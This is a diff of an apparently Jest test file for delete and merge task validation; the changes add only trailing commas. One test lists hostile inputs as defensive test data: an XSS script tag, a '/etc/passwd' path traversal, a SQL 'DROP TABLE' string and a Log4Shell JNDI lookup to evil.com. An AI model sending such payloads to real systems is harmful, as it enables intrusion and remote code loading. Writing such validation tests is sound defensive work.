@@ -6,13 +6,13 @@ describe('Delete and Merge Task Operations Validation', () => {
       it('should require confirm_deletion parameter for delete operations', () => {
         const deleteTaskParams = {
           task_id: 'task123',
-          confirm_deletion: true
+          confirm_deletion: true,
         };
 
         const bulkDeleteParams = {
           task_ids: ['task1', 'task2'],
           confirm_deletion: true,
-          continue_on_error: false
+          continue_on_error: false,
         };
 
         expect(deleteTaskParams.confirm_deletion).toBe(true);
@@ -33,17 +33,17 @@ describe('Delete and Merge Task Operations Validation', () => {
         const validBulkDelete = {
           task_ids: ['task1', 'task2', 'task3'],
           confirm_deletion: true,
-          continue_on_error: false
+          continue_on_error: false,
         };
 
         const maxBulkDelete = {
           task_ids: Array.from({ length: 50 }, (_, i) => `task${i + 1}`),
-          confirm_deletion: true
+          confirm_deletion: true,
         };
 
         const exceedsLimit = {
           task_ids: Array.from({ length: 51 }, (_, i) => `task${i + 1}`),
-          confirm_deletion: true
+          confirm_deletion: true,
         };
 
         expect(Array.isArray(validBulkDelete.task_ids)).toBe(true);
@@ -59,7 +59,7 @@ describe('Delete and Merge Task Operations Validation', () => {
           '<script>alert("xss")</script>',
           '../../etc/passwd',
           'DROP TABLE tasks;',
-          '${jndi:ldap://evil.com/a}' // eslint-disable-line no-template-curly-in-string
+          '${jndi:ldap://evil.com/a}', // eslint-disable-line no-template-curly-in-string
         ];
 
         maliciousInputs.forEach(input => {
@@ -75,7 +75,7 @@ describe('Delete and Merge Task Operations Validation', () => {
           { operation: 'bulk_delete_tasks', requires: 'confirm_deletion' },
           { operation: 'delete_subtask', requires: 'confirm_deletion' },
           { operation: 'delete_list', requires: 'confirm_deletion' },
-          { operation: 'delete_doc', requires: 'confirm_deletion' }
+          { operation: 'delete_doc', requires: 'confirm_deletion' },
         ];
 
         operationsRequiringConfirmation.forEach(op => {
@@ -91,7 +91,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         const validMerge = {
           primary_task_id: 'primary123',
           secondary_task_ids: ['secondary1', 'secondary2'],
-          confirm_merge: true
+          confirm_merge: true,
         };
 
         expect(validMerge.primary_task_id).toBe('primary123');
@@ -112,7 +112,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         const noSecondaryTasks = {
           primary_task_id: 'primary123',
           secondary_task_ids: [],
-          confirm_merge: true
+          confirm_merge: true,
         };
 
         expect(noSecondaryTasks.secondary_task_ids.length).toBe(0); // Should be rejected
@@ -120,7 +120,7 @@ describe('Delete and Merge Task Operations Validation', () => {
 
       it('should use the native merge endpoint request shape', () => {
         const mergeRequestBody = {
-          source_task_ids: ['secondary1', 'secondary2']
+          source_task_ids: ['secondary1', 'secondary2'],
         };
 
         expect(Array.isArray(mergeRequestBody.source_task_ids)).toBe(true);
@@ -137,7 +137,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         'permanently remove',
         'permanently delete',
         'confirm_deletion',
-        'confirm_merge'
+        'confirm_merge',
       ];
 
       warningIndicators.forEach(indicator => {
@@ -149,7 +149,7 @@ describe('Delete and Merge Task Operations Validation', () => {
     it('should require explicit boolean confirmation', () => {
       const confirmationTypes = [
         { param: 'confirm_deletion', type: 'boolean', required: true },
-        { param: 'confirm_merge', type: 'boolean', required: true }
+        { param: 'confirm_merge', type: 'boolean', required: true },
       ];
 
       confirmationTypes.forEach(conf => {
@@ -163,7 +163,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         { confirm_deletion: false },
         { confirm_merge: false },
         { confirm_deletion: undefined },
-        { confirm_merge: null }
+        { confirm_merge: null },
       ];
 
       falseConfirmations.forEach(conf => {
@@ -178,7 +178,7 @@ describe('Delete and Merge Task Operations Validation', () => {
       const limits = {
         bulk_delete_max: 50,
         merge_secondary_max: 10,
-        task_id_min_length: 1
+        task_id_min_length: 1,
       };
 
       expect(limits.bulk_delete_max).toBe(50);
@@ -193,7 +193,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         { case: 'single_task_bulk_delete', count: 1 },
         { case: 'max_tasks_bulk_delete', count: 50 },
         { case: 'single_secondary_merge', count: 1 },
-        { case: 'max_secondary_merge', count: 10 }
+        { case: 'max_secondary_merge', count: 10 },
       ];
 
       edgeCases.forEach(edge => {
@@ -217,7 +217,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         'Rate limit exceeded',
         'Invalid task ID format',
         'Confirmation not provided',
-        'Operation limit exceeded'
+        'Operation limit exceeded',
       ];
 
       errorScenarios.forEach(scenario => {
@@ -232,7 +232,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         'Bulk task deletion cancelled. You must set confirm_deletion to true',
         'Task merge cancelled. You must set confirm_merge to true',
         'This action cannot be undone',
-        'permanently removed'
+        'permanently removed',
       ];
 
       errorMessages.forEach(message => {
@@ -253,7 +253,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         'task_name',
         'task_id',
         'merged_tasks',
-        'merged_content'
+        'merged_content',
       ];
 
       expectedResponseFields.forEach(field => {
@@ -268,7 +268,7 @@ describe('Delete and Merge Task Operations Validation', () => {
         'has been permanently deleted',
         'This action cannot be undone',
         'Task merge completed',
-        'migrated into the primary task'
+        'migrated into the primary task',
       ];
 
       confirmationElements.forEach(element => {
